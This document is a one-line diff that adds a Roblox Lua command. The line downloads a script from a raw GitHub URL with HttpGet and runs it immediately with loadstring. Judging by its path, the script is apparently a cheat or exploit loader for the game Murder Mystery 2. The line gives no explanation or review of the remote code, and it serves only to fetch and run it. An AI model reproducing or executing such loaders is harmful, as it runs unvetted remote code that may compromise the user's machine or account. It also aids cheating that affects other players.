@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/murder-mystery-2-spam7-9uowrij3oelmmu.lua"))()
